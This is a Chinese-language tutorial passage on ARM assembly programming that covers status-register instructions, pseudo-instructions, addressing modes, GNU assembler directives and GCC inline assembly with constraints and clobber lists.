psr CPSR 或SPSR​ MRS指令举例如下：​ MRS R1,CPSR ;将CPSR状态寄存器读取，保存到R1 中​ MRS R2,SPSR ;将SPSR状态寄存器读取，保存到R2 中​ MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许/禁止IRQ/FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来。​ 使能IRQ 中断例程：​ ENABLE_IRQ​ MRS R0,CPSR​ BIC R0。R0,#0x80​ MSR CPSR_c,R0​ MOV PC,LR​ 禁能IRQ 中断例程：​ DISABLE_IRQ​ MRS R0,CPSR​ ORR R0,R0,#0x80​ MSR CPSR_c,R0​ MOV PC,LR MSR​ 写状态寄存器指令。在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR。指令格式如下：​ MSR{cond} psr_fields,#immed_8r​ MSR{cond} psr_fields,Rm​ 其中： psr CPSR 或SPSR​ fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)：​ c 控制域屏蔽字节(psr[7…0])​ x 扩展域屏蔽字节(psr[15…8])​ s 状态域屏蔽字节(psr[23。…16])​ f 标志域屏蔽字节(psr[31…24])​ immed_8r 要传送到状态寄存器指定域的立即数，8 位。​ Rm 要传送到状态寄存器指定域的数据的源寄存器。​ MSR 指令举例如下：​ MSR CPSR_c,#0xD3 ;CPSR[7…0]=0xD3，即切换到管理模式。​ MSR CPSR_cxsf,R3 ;CPSR=R3​ 只有在特权模式下才能修改状态寄存器。​ 程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态/Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许/禁止IRQ/FIQ 中断等设置。​ 堆栈指令实始化例程：​ INITSTACK​ MOV R0,LR ;保存返回地址​ ;设置管理模式堆栈​ MSR CPSR_c,#0xD3​ LDR SP,StackSvc​ ;设置中断模式堆栈​ MSR CPSR_c,#0xD2​ LDR SP,StackIrq​ … 1.3.6. ARM 伪指令​ ARM 伪指令不是ARM 指令集中的指令，只是为了编程方便编译器定义了伪指令，使用时可以像其它ARM 指令一样使用，但在编译时这些指令将被等效的ARM 指令代替。ARM伪指令有四条，分别为ADR 伪指令、ADRL 伪指令、LDR 伪指令和NOP 伪指令。 ADR​ 小范围的地址读取伪指令。ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败。​ ADR 伪指令格式如下：​ ADR{cond} register,exper​ 其中：register 加载的目标寄存器。​ exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。​ 对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。​ ADR 伪指令举例如下：​ LOOP MOV R1, #0xF0​ …​ ADR R2, LOOP ;将LOOP 的地址放入R2​ ADR R3, LOOP+4​ 可以用ADR 加载地址，实现查表：​ …​ ADR R0,DISP_TAB ;加载转换表地址​ LDRB R1,[R0,R2] ;使用R2作为参数，进行查表​ …​ DISP_TAB​ DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90 ADRL​ 中等范围的地址读取伪指令。ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败。ADRL伪指令格式如下：​ ADR{cond} register,exper​ 其中：register 加载的目标寄存器。​ expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。​ ADRL 伪指令举例如下：​ ADRL R0,DATA_BUF​ …​ ADRL R1 DATA_BUF+80​ …​ DATA_BUF​ SPACE 100 ;定义100 字节缓冲区​ 可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：​ …​ ADR LR,RETURNI ;设置返回地址​ ADRL R1Thumb_Sub+1 ;取得了Thumb 子程序入口地址，且R1 的0 位置1​ BX R1 ;调用Thumb子程序，并切换处理器状态​ RETURNI​ …​ CODE16​ Thumb_Sub​ MOV R1,#10​ … LDR​ 大范围的地址读取伪指令。LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量。LDR 伪指令格式如下：​ LDR{cond} register,=expr/label_expr​ 其中：register 加载的目标寄存器​ expr 32 位立即数。​ label_expr 基于PC 的地址表达式或外部表达式。​ LADR 伪指令举例如下：。​ LDR R0,=0x123456 ;加载32 位立即数0x12345678​ LDR R0,=DATA_BUF+60 ;加载DATA_BUF 地址+60​ …​ LTORG ;声明文字池​ 伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数：​ …​ LDR R0,=IOPIN ;加载GPIO 寄存器IOPIN 的地址​ LDR R1,[R0] ;读取IOPIN 寄存器的值​ …​ LDR R0,=IOSET​ LDR R1,=0x00500500​ STR R1,[R0] ;IOSET=0x00500500​ …​ 从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“=”号 NOP​ 空操作伪指令。NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等，NOP 伪指令格式如下：​ NOP​ NOP​ NOP​ NOP​ SUBS R1, R1, #1​ BNE DELAY1​ … 1.4. 寻址方式1.4.1. 立即数寻址立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%”。 1.4.2. 寄存器寻址1.4.3. 寄存器间接寻址以寄存器中的值作为操作数的地址，而操作数本身放在存储器中。 例如： 1ADD R0，R1，[R2] 1.4.4. 基址变址寻址将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址。 例如：LDR R0，[R1，#4] R0&lt;-[R1+4] 1.4.5. 多寄存器寻址一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值。 LDMIA R0，{R1，R2，R3，R4} 1.4.6. 相对寻址以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址。 例如：BL NEXT; 1.4.7. 堆栈寻址使用一个堆栈指针的专用寄存器指示当前操作位置 递增堆栈：向高地址方向生长 递减堆栈：向低地址方向生长 满堆栈：堆栈指针指向最后压入堆栈的有效数据 空堆栈：堆栈指针指向下一个要放入数据的空位置 2. GNU ARM混编​ 汇编源程序一般用于系统最基本的初始化：初始化堆栈指针、设置页表、操作 ARM的协处理器等。这些初始化工作完成后就可以跳转到C代码main函数中执行。 1.1. GNU汇编语言语句格式​ 任何Linux汇编行都是如下结构：[:][} @comment l instruction为指令 l directive为伪操作 l pseudo-instruction为伪指令 l :为标号, GNU汇编中，任何以冒号结尾的标识符都被认为是一个标号，而不一定非要在一行的开始。 l comment为语句的注释 下面定义一个”add”的函数，最终返回两个参数的和： .section.text, “x” .globaladd @ give the symbol “add” externallinkage add: ​ ADD r0, r0, r1 @ add input arguments ​ MOV pc, lr @ return from subroutine @ endof program 注意： l ARM指令，伪指令，伪操作，寄存器名可以全部为大写字母，也可全部为小写字母，但不可大小写混用。 l 如果语句太长，可以将一条语句分几行来书写，在行末用“\”表示换行（即下一行与本行为同一语句）。“\”后不能有任何字符，包含空格和制表符（Tab)。 1.2. GNU汇编程序中的标号symbol（或label）​ 标号只能由a～z，A～Z，0～9，“.”，_等（由点、字母、数字、下划线等组成，除局部标号外，不能以数字开头）字符组成。 Symbol的本质：代表它所在的地址,因此也可以当作变量或者函数来使用。 l 段内标号的地址值在汇编时确定； l 段外标号的地址值在连接时确定。 Symbol的分类：3类（依据标号的生成方式）。 基于PC的标号。基于PC的标号是位于目标指令前的标号或者程序中数据定义伪操作前的标号。这种标号在汇编时将被处理成PC值加上（或减去）一个数字常量，常用于表示跳转指令”b”等的目标地址，或者代码段中所嵌入的少量数据。 基于寄存器的标号。基于寄存器的标号常用MAP和FIELD来定义，也可以用EQU来定义。这种标号在汇编时将被处理成寄存器的值加上（或减去）一个数字常量，常用于访问数据段中的数据。 绝对地址。绝对地址是一个32位数据。它可以寻址的范围为[0，232-1]即可以直接寻址整个内存空间。 特别说明：局部标号Symbol ​ 局部标号主要在局部范围内使用，而且局部标号可以重复出现。它由两部组成：开头是一个0-99直接的数字，后面紧接一个通常表示该局部变量作用范围的符号。局部变量的作用范围通常为当前段，也可以用ROUT来定义局部变量的作用范围。 ​ 局部变量定义的语法格式：N{routname} l N：为0~99之间的数字。 l routname：当前局部范围的名称（为符号），通常为该变量作用范围的名称（用ROUT伪操作定义的）。 ​ 局部变量引用的语法格式：%{F|B}{A|T}N{routname} l %：表示引用操作 l N：为局部变量的数字号 l routname：为当前作用范围的名称（用ROUT伪操作定义的） l F：指示编译器只向前搜索 l B：指示编译器只向后搜索 l A：指示编译器搜索宏的所有嵌套层次 l T：指示编译器搜索宏的当前层次 例：使用局部符号的例子，一段循环程序 subs r0, r0, #1 @每次循环使r0=r0-1 bne 1F @跳转到1标号去执行 注意： l 如果F和B都没有指定，编译器先向前搜索，再向后搜索 l 如果A和T都没有指定，编译器搜索所有从当前层次到宏的最高层次，比当前层次低的层次不再搜索。 l 如果指定了routname，编译器向前搜索最近的ROUT伪操作，若routname与该ROUT伪操作定义的名称不匹配，编译器报告错误，汇编失败。 1.3. GNU汇编程序中的分段 .section伪操作 .section &lt;section_name&gt; {,””} Startsa new code or data section. Sections in GNU are called .text, a code section, .data, an initializeddata section, and .bss, an uninitialized data section. Thesesections have default flags, and the linker understands the default names(similardirective to the armasm directive AREA).The following are allowable .section flags for ELF format files: Meaning a allowable section w writable section x executable section 中文解释： 用户可以通过.section伪操作来自定义一个段,格式如下： .section section_name [,”flags”[, %type[,flag_specific_arguments]]] 每一个段以段名为开始, 以下一个段名或者文件结尾为结束。这些段都有缺省的标志（flags），连接器可以识别这些标志。(与arm asm中的AREA相同)。下面是ELF格式允许的段标志flags： &lt;标志&gt; 含义 a 允许段 w 可写段 x 执行段 例：定义一个“段” .section.mysection @自定义数据段，段名为 “.mysection” .align 2 strtemp: ​ .ascii “Temp string \n\0” @对这一句的理解，我觉得应该是：将”Temp string \n\0”这个字符串存储在以标号strtemp为起始地址的一段内存空间里 汇编系统预定义的段名 l .text @代码段 l .data @初始化数据段.data Read-write initialized long data. l .bss @未初始化数据段 l .sdata @ .sdata Read-write initialized short data. l .sbss @ 注意：源程序中.bss段应该在.text段之前。 1.4. GNU汇编语言定义入口点汇编程序的缺省入口是_start标号，用户也可以在连接脚本文件中用ENTRY标志指明其它入口点。 例：定义入口点 .section .data &lt; initialized data here&gt; .section .bss &lt; uninitialized data here&gt; .section .text .globl _start _start: 1.5. GNU汇编程序中的宏定义格式如下： .macro 宏名参数名列表 @伪指令.macro定义一个宏 宏体 .endm @.endm表示宏结束 ​ 如果宏使用参数,那么在宏体中使用该参数时添加前缀“\”。宏定义时的参数还可以使用默认值。可以使用.exitm伪指令来退出宏。 例：宏定义 .macroSHIFTLEFT a, b .if \b&lt; 0 MOV \a,\a, ASR #-\b .exitm .endif MOV \a,\a, LSL #\b .endm 1.6. GNU汇编程序中的常数 十进制数以非0数字开头,如:123和9876； 二进制数以0b开头,其中字母也可以为大写； 八进制数以0开始,如:0456,0123； 十六进制数以0x开头,如:0xabcd,0X123f； 字符串常量需要用引号括起来,中间也可以使用转义字符,如: “You are welcome!\n”； 当前地址以“.”表示,在GNU汇编程序中可以使用这个符号代表当前指令的地址； 表达式：在汇编程序中的表达式可以使用常数或者数值, “-”表示取负数, “~”表示取补,“&lt;&gt;”表示不相等,其他的符号如:+、-、*、/、%、&lt;、&lt;&lt;、&gt;、&gt;&gt;、|、&amp;、^、!、==、&gt;=、&lt;=、&amp;&amp;、|| 跟C语言中的用法相似。 1.7. GNU ARM汇编的常用伪操作​ 在前面已经提到过了一些为操作，还有下面一些为操作： l 数据定义伪操作： .byte，.short，.long，.quad，.float，.string/.asciz/.ascii，重复定义伪操作.rept，赋值语句.equ/.set ； l 函数的定义； l 对齐方式伪操作 .align； l 源文件结束伪操作.end； l .include伪操作； l if伪操作； l .global/ .globl 伪操作； l .type伪操作； l 列表控制语句； 别于GNU AS汇编的通用伪操作,下面是ARM特有的伪操作： .reg ，.unreq ，.code ，.thumb ，.thumb_func ，.thumb_set， .ltorg ，.pool 数据定义伪操作 l .byte:单字节定义，如：.byte 1,2,0b01,0x34,072,’s’ ； l .short:定义双字节数据，如:.short 0x1234,60000 ； l .long:定义4字节数据，如:.long 0x12345678,23876565 l .quad:定义8字节，如:.quad 0x1234567890abcd l .float：定义浮点数，如：.float 0f-314159265358979323846264338327\ ​ 95028841971.693993751E-40 @ - pi l .string/.asciz/.ascii：定义多个字符串，如: .string “abcd”,”efgh”, “hello!” .asciz “qwer”,”sun”, “world!” .ascii “welcome\0” ​ 注意：ascii伪操作定义的字符串需要自行添加结尾字符’\0’。 l .rept:重复定义伪操作, 格式如下： .rept 重复次数 数据定义 .endr @结束重复定义 例： .rept 3 .byte 0x23 .endr l .equ/.set: 赋值语句, 格式如下： .equ(.set)变量名，表达式 例： .equ abc, 3 @让abc=3 函数的定义伪操作 l 函数的定义,格式如下： 函数名: 函数体 返回语句 ​ 一般的,函数如果需要在其他文件中调用, 需要用到.global伪操作将函数声明为全局函数。为了不至于在其他程序在调用某个C函数时发生混乱,对寄存器的使用我们需要遵循APCS准则。函数编译器将处理函数代码为一段.global的汇编码。 l 函数的编写应当遵循如下规则： a. a1-a4寄存器（参数、结果或暂存寄存器，r0到r3 的同义字）以及浮点寄存器f0-f3(如果存在浮点协处理器)在函数中是不必保存的； b. 如果函数返回一个不大于一个字大小的值，则在函数结束时应该把这个值送到 r0 中； c. 如果函数返回一个浮点数，则在函数结束时把它放入浮点寄存器f0中； d. 如果函数的过程改动了sp（堆栈指针，r13）、fp（框架指针，r11）、sl（堆栈限制，r10）、lr（连接寄存器，r14）、v1-v8（变量寄存器，r4 到 r11）和 f4-f7,那么函数结束时这些寄存器应当被恢复为包含在进入函数时它所持有的值。 .align .end .include .incbin伪操作 l .align:用来指定数据的对齐方式,格式如下: ​ .align [absexpr1, absexpr2] ​ 以某种对齐方式,在未使用的存储区域填充值. 第一个值表示对齐方式,4, 8,16或 32.第二个表达式值表示填充的值。 l .end:表明源文件的结束。 l .include:可以将指定的文件在使用.include 的地方展开,一般是头文件,例如: ​ .include “myarmasm.h” l .incbin伪操作可以将原封不动的一个二进制文件编译到当前文件中,使用方法如下: ​ .incbin”file”[,skip[,count]] ​ skip表明是从文件开始跳过skip个字节开始读取文件,count是读取的字数. ..if伪操作 ​ 根据一个表达式的值来决定是否要编译下面的代码, 用.endif伪操作来表示条件判断的结束,中间可以使用.else来决定.if的条件不满足的情况下应该编译哪一部分代码。 .if有多个变种: .ifdefsymbol @判断symbol是否定义 .ifcstring1,string2 @字符串string1和string2是否相等,字符串可以用单引号括起来 .ifeqexpression @判断expression的值是否为0 .ifeqsstring1,string2 @判断string1和string2是否相等,字符串必须用双引号括起来 .ifgeexpression @判断expression的值是否大于等于0 .ifgtabsolute expression @判断expression的值是否大于0 .ifleexpression @判断expression的值是否小于等于0 .ifltabsolute expression @判断expression的值是否小于0 .ifncstring1,string2 @判断string1和string2是否不相等, 其用法跟.ifc恰好相反。 .ifndefsymbol, .ifnotdef symbol @判断是否没有定义symbol, 跟.ifdef恰好相反 .ifneexpression @如果expression的值不是0, 那么编译器将编译下面的代码 .ifnesstring1,string2 @如果字符串string1和string2不相等, 那么编译器将编译下面的代码. .global .type .title .list l .global/ .globl ：用来定义一个全局的符号，格式如下: ​ .global symbol 或者 .globl symbol l .type：用来指定一个符号的类型是函数类型或者是对象类型, 对象类型一般是数据, 格式如下: ​ .type 符号, 类型描述 例： .globla .data .align4 .typea, @object .sizea, 4 a: .long10 例： .section.text .typeasmfunc, @function .globlasmfunc asmfunc: mov pc,lr 列表控制语句: .title：用来指定汇编列表的标题,例如: .title “my program” .list：用来输出列表文件. ARM特有的伪操作 l .reg: 用来给寄存器赋予别名,格式如下: ​ 别名 .req 寄存器名 l .unreq: 用来取消一个寄存器的别名,格式如下: .unreq 寄存器别名 ​ 注意被取消的别名必须事先定义过,否则编译器就会报错,这个伪操作也可以用来取消系统预制的别名, 例如r0, 但如果没有必要的话不推荐那样做。 l .code伪操作用来选择ARM或者Thumb指令集,格式如下: .code 表达式 如果表达式的值为16则表明下面的指令为Thumb指令,如果表达式的值为32则表明下面的指令为ARM指令. l .thumb伪操作等同于.code 16, 表明使用Thumb指令, 类似的.arm等同于.code 32 l .force_thumb伪操作用来强制目标处理器选择thumb的指令集而不管处理器是否支持 l .thumb_func伪操作用来指明一个函数是thumb指令集的函数 l .thumb_set伪操作的作用类似于.set, 可以用来给一个标志起一个别名, 比.set功能增加的一点是可以把一个标志标记为thumb函数的入口, 这点功能等同于.thumb_func l .ltorg用于声明一个数据缓冲池(literal pool)的开始,它可以分配很大的空间。 l .pool的作用等同.ltorg l .space&lt;number_of_bytes&gt; {,&lt;fill_byte&gt;} ​ 分配number_of_bytes字节的数据空间，并填充其值为fill_byte，若未指定该值，缺省填充0。（与armasm中的SPACE功能相同） l .word {,} …插入一个32-bit的数据队列。（与armasm中的DCD功能相同）可以使用.word把标识符作为常量使用。 例： Start: valueOfStart: ​ .word Start 这样程序的开头Start便被存入了内存变量valueOfStart中。 l .hword {,} … 插入一个16-bit的数据队列。（与armasm中的DCW相同） 1.8. GNU ARM汇编特殊字符和语法 代码行中的注释符号: ‘@’ 整行注释符号: ‘#’ 语句分离符号: ‘;’ 立即数前缀: ‘#’ 或 ‘$’ 3. ARM GCC 内嵌汇编对于基于ARM的RISC处理器，GNUC编译器提供了在C代码中内嵌汇编的功能。这种非常酷的特性提供了C代码没有的功能，比如手动优化软件关键部分的代码、使用相关的处理器指令。这里设想了读者是熟练编写ARM汇编程序读者，因为该片文档不是ARM汇编手册。同样也不是C语言手册。这篇文档假设使用的是GCC 4 的版本，但是对于早期的版本也有效。 GCCasm 声明 让我们以一个简单的例子开始。就像C中的声明一样，下面的声明代码可能出现在你的代码中。 /NOP 例子 / asm(“movr0,r0”); 该语句的作用是将r0移动到r0中。换句话讲他并不干任何事。典型的就是NOP指令，作用就是短时的延时。 请接着阅读和学习这篇文档，因为该声明并不像你想象的和其他的C语句一样。内嵌汇编使用汇编指令就像在纯汇编程序中使用的方法一样。可以在一个asm声明中写多个汇编指令。但是为了增加程序的可读性，最好将每一个汇编指令单独放一行。 asm( “mov r0, r0\n\t” “mov r0, r0\n\t” “mov r0, r0\n\t” “mov r0, r0” ); 换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。到目前为止，汇编指令和你写的纯汇编程序中的代码没什么区别。但是对比其它的C声明，asm的常量和寄存器的处理是不一样的。通用的内嵌汇编模版是这样的。 asm(code : output operand list : input operand list : clobberlist); 汇编和C语句这间的联系是通过上面asm声明中可选的outputoperand list和input operand list。Clobber list后面再讲。 下面是将c语言的一个整型变量传递给汇编，逻辑左移一位后在传递给C语言的另外一个整型变量。 / Rotating bits example / asm(“mov %[result], %[value], ror #1” :[result] “=r” (y) : [value] “r” (x)); 每一个asm语句被冒号（:）分成了四个部分。 汇编指令放在第一部分中的“”中间。 “mov %[result], %[value], ror #1” 接下来是冒号后的可选择的output operand list，每一个条目是由一对[]（方括号）和被他包括的符号名组成，它后面跟着限制性字符串，再后面是圆括号和它括着的C变量。这个例子中只有一个条目。 [result] “=r” (y) 接着冒号后面是输入操作符列表，它的语法和输入操作列表一样 [value] “r” (x) 破坏符列表，在本例中没有使用 就像上面的NOP例子，asm声明的4个部分中，只要最尾部没有使用的部分都可以省略。但是有有一点要注意的是，上面的4个部分中只要后面的还要使用，前面的部分没有使用也不能省略，必须空但是保留冒号。下面的一个例子就是设置ARMSoc的CPSR寄存器，它有input但是没有output operand。 asm(“msr cpsr,%[ps]” : : [ps]”r”(status)) 即使汇编代码没有使用，代码部分也要保留空字符串。下面的例子使用了一个特别的破坏符，目的就是告诉编译器内存被修改过了。这里的破坏符在下面的优化部分在讲解。 asm(“”:::”memory”); 为了增加代码的可读性，你可以使用换行，空格，还有C风格的注释。 asm(“mov %[result], %[value], ror#1” ​ : [result]”=r” (y) /Rotation result. / ​ : [value]”r” (x) /Rotated value. / ​ : / No clobbers / ); 在代码部分%后面跟着的是后面两个部分方括号中的符号，它指的是相同符号操作列表中的一个条目。 %[result]表示第二部分的C变量y，%[value]表示三部分的C变量x； 符号操作符的名字使用了独立的命名空间。这就意味着它使用的是其他的符号表。简单一点就是说你不必关心使用的符号名在C代码中已经使用了。在早期的C代码中，循环移位的例子必须要这么写： asm(“mov %0, %1, ror #1” :”=r” (result) : “r” (value)) 在汇编代码中操作数的引用使用的是%后面跟一个数字，%1代表第一个操作数，%2代码第二个操作数，往后的类推。这个方法目前最新的编译器还是支持的。但是它不便于维护代码。试想一下，你写了大量的汇编指令的代码，要是你想插入一个操作数，那么你就不得不从新修改操作数编号。 优化C代码 有两种情况决定了你必须使用汇编。1st，C限制了你更加贴近底层操作硬件，比如，C中没有直接修改程序状态寄存器（PSR）的声明。2nd就是要写出更加优化的代码。毫无疑问GNUC代码优化器做的很好，但是他的结果和我们手工写的汇编代码相差很远。 这一部分有一点很重要，也是被别人忽视最多的就是：我们在C代码中通过内嵌汇编指令添加的汇编代码，也是要被C编译器的优化器处理的。让我们下面做个试验来看看吧。 下面是代码实例。 bigtree@just:~/embedded/basic-C$ arm-linux-gcc -c test.c bigtree@just:~/embedded/basic-C$ arm-linux-objdump -D test.o 编译器选择r3作为循环移位使用。它也完全可以选择为每一个C变量分配寄存器。Load或者store一个值并不显式的进行。下面是其它编译器的编译结果。 E420A0E1 mov r2, r4, ror #1 @ y, x 编译器为每一个操作数选择一个相应的寄存器，将操作过的值cache到r4中，然后传递该值到r2中。这个过程你能理解不？ 有的时候这个过程变得更加糟糕。有时候编译器甚至完全抛弃你嵌入的汇编代码。C编译器的这种行为，取决于代码优化器的策略和嵌入汇编所处的上下文。如果在内嵌汇编语句中不使用任何输出部分，那么C代码优化器很有可能将该内嵌语句完全删除。比如NOP例子，我们可以使用它作为延时操作，但是对于编译器认为这影响了程序的执行速速，认为它是没有任何意义的。 上面的解决方法还是有的。那就是使用volatile关键字。它的作用就是禁止优化器优化。将NOP例子修改过后如下： / NOP example, revised / asm volatile(“movr0, r0”); 下面还有更多的烦恼等着我们。一个设计精细的优化器可能重新排列代码。看下面的代码： i++; if (j == 1) x += 3; i++; 优化器肯定是要从新组织代码的，两个i++并没有对if的条件产生影响。更进一步的来讲，i的值增加2，仅仅使用一条ARM汇编指令。因而代码要重新组织如下： if (j == 1) x += 3; i += 2; 这样节省了一条ARM指令。结果是：这些操作并没有得到许可。 这些将对你的代码产生很到的影响，这将在下面介绍。下面的代码是c乘b，其中c和b中的一个或者两个可能会被中断处理程序修改。进入该代码前先禁止中断，执行完该代码后再开启中断。 asm volatile(“mrs r12,cpsr\n\t” “orr r12, r12, #0xC0\n\t” “msr cpsr_c, r12\n\t” ::: “r12”, “cc”); c = b; / This may fail. */ asm volatile(“mrs r12, cpsr\n” “bic r12, r12, #0xC0\n” “msr cpsr_c, r12” ::: “r12”, “cc”); 但是不幸的是针对上面的代码，优化器决定先执行乘法然后执行两个内嵌汇编，或相反。这样将会使得我们的代码变得毫无意义。 我们可以使用clobberlist帮忙。上面例子中的clobber list如下： “r12”,”cc” 上面的clobber list将会将向编译器传达如下信息，修改了r12和程序状态寄存器的标志位。Btw，直接指明使用的寄存器，将有可能阻止了最好的优化结果。通常你只要传递一个变量，然后让编译器自己选择适合的寄存器。另外寄存器名，cc（condition registor 状态寄存器标志位），memory都是在clobber list上有效的关键字。它用来向编译器指明，内嵌汇编指令改变了内存中的值。这将强迫编译器在执行汇编代码前存储所有缓存的值，然后在执行完汇编代码后重新加载该值。这将保留程序的执行顺序，因为在使用了带有memory clobber的asm声明后，所有变量的内容都是不可预测的。 asm volatile(“mrs r12,cpsr\n\t” “orr r12, r12, #0xC0\n\t” “msr cpsr_c, r12\n\t” :: : “r12”, “cc”,”memory”); c = b; / This is safe. */ asm volatile(“mrs r12, cpsr\n” “bic r12, r12, #0xC0\n” “msr cpsr_c, r12” ::: “r12”, “cc”,”memory”); 使所有的缓存的值都无效，只是局部最优（suboptimal）。你可以有选择性的添加dummyoperand 来人工添加依赖。 asm volatile(“mrs r12,cpsr\n\t” “orr r12, r12, #0xC0\n\t” “msr cpsr_c, r12\n\t” : “=X” (b) :: “r12”,”cc”); c = b; / This is safe. */ asm volatile(“mrs r12 上面的第一个asm试图修改变量先b，第二个asm试图修改c。这将保留三个语句的执行顺序，而不要使缓存的变量无效。 理解优化器对内嵌汇编的影响很重要。如果你读到这里还是云里雾里，最好是在看下个主题之前再把这段文章读几遍^_^。 Input and output operands 前面我们学到，每一个input和output operand，由被方括号[]中的符号名，限制字符串，圆括号中的C表达式构成。 这些限制性字符串有哪些，为什么我们需要他们？你应该知道每一条汇编指令只接受特定类型的操作数。例如：跳转指令期望的跳转目标地址。不是所有的内存地址都是有效的。因为最后的opcode只接受24位偏移。但矛盾的是跳转指令和数据交换指令都希望寄存器中存储的是32位的目标地址。在所有的例子中，C传给operand的可能是函数指针。所以面对传给内嵌汇编的常量、指针、变量，编译器必须要知道怎样组织到汇编代码中。 对于ARM核的处理器，GCC 4 提供了一下的限制。 Constraint Usage in ARM state Usage in Thumb state f Floating point registers f0 .. f7 Not available G Immediate floating point constant Not available H Same a G, but negated Not available I Immediate value in data processing instructionse.g. ORR R0, R0, #operand Constant in the range 0 .. 255e.g. SWI operand J Indexing constants -4095 .. 4095e.g. LDR R1, [PC, #operand] Constant in the range -255 .. -1e.g. SUB R0, R0, #operand K Same as I, but inverted Same as I, but shifted L Same as I, but negated Constant in the range -7 .. 7e.g. SUB R0, R1, #operand l Same as r Registers r0..r7e.g. PUSH operand M Constant in the range of 0 .. 32 or a power of 2e.g. MOV R2, R1, ROR #operand Constant that is a multiple of 4 in the range of 0 .. 1020e.g. ADD R0, SP, #operand m Any valid memory address N Not available Constant in the range of 0 .. 31e.g. LSL R0, R1, #operand o Not available Constant that is a multiple of 4 in the range of -508 .. 508e.g. ADD SP, #operand r General register r0 .. r15e.g. SUB operand1, operand2, operand3 Not available W Vector floating point registers s0 .. s31 Not available X Any operand = ：Write-only operand, usually used for all output operands+ ：Read-write operand, must be listed as an output operand&amp; ：A register that should be used for output only Output operands必须为write-only，相应C表达式的值必须是左值。Input operands必须为read-only。C编译器是没有能力做这个检查。 比较严格的规则是：不要试图向input operand写。但是如果你想要使用相同的operand作为input和output。限制性modifier（+）可以达到效果。例子如下： asm(“mov %[value], %[value], ror #1” : [value]”+r” (y)) 和上面例子不一样的是，最后的结果存储在input variable中。 可能modifier + 不支持早期的编译器版本。庆幸的是这里提供了其他解决办法，该方法在最新的编译器中依然有效。对于input operators有可能使用单一的数字n在限制字符串中。使用数字n可以告诉编译器使用的第n个operand，operand都是以0开始计数。下面是例子： asm(“mov %0, %0, ror #1” : “=r” (value) :”0” (value)) 限制性字符串“0”告诉编译器，使用和第一个output operand使用同样input register。 请注意，在相反的情况下不会自动实现。如果我没告诉编译器那样做，编译器也有可能为input和output选择相同的寄存器。第一个例子中就为input和output选择了r3。 在多数情况下这没有什么，但是如果在input使用前output已经被修改过了，这将是致命的。在input和output使用不同寄存器的情况下，你必须使用&amp;modifier来限制outputoperand。下面是代码示例： asm volatile(“ldr %0, [%1]””\n\t” ​ “str %2, [%1, #4]””\n\t” ​ : “=&amp;r” (rdv) ​ : “r”(&amp;table), “r” (wdv) ​ : “memory”); 在以张表中读取一个值然后在写到该表的另一个位置。 其他 内嵌汇编作为预处理宏 要是经常使用使用部分汇编，最好的方法是将它以宏的形式定义在头文件中。使用该头文件在严格的ANSI模式下会出现警告。为了避免该类问题，可以使用asm代替asm，volatile代替volatile。这可以等同于别名。下面就是个例程： #define BYTESWAP(val) \ asm volatile ( \ ​ “eor r3, %1, %1, ror #16\n\t” \ ​ “bic r3, r3, #0x00FF0000\n\t” \ ​ “mov %0, %1, ror #8\n\t” \ ​ “eor %0, %0, r3, lsr #8” \ ​ : “=r” (val) \ ​ : “0”(val) \ ​ : “r3”, “cc” \ ); C 桩函数 宏定义包含的是相同的代码。这在大型routine中是不可以接受的。这种情况下最好定义个桩函数。 unsigned long ByteSwap(unsigned longval) { asm volatile ( ​ “eor r3, %1, %1, ror #16\n\t” ​ “bic r3, r3, #0x00FF0000\n\t” ​ “mov %0, %1, ror #8\n\t” ​ “eor %0, %0, r3, lsr #8” ​ : “=r” (val) ​ : “0”(val) ​ : “r3” ); return val; } 替换C变量的符号名 默认的情况下，GCC使用同函数或者变量相同的符号名。你可以使用asm声明，为汇编代码指定一个不同的符号名 unsigned long value asm(“clock”) = 3686400 这个声明告诉编译器使用了符号名clock代替了具体的值。 替换C函数的符号名 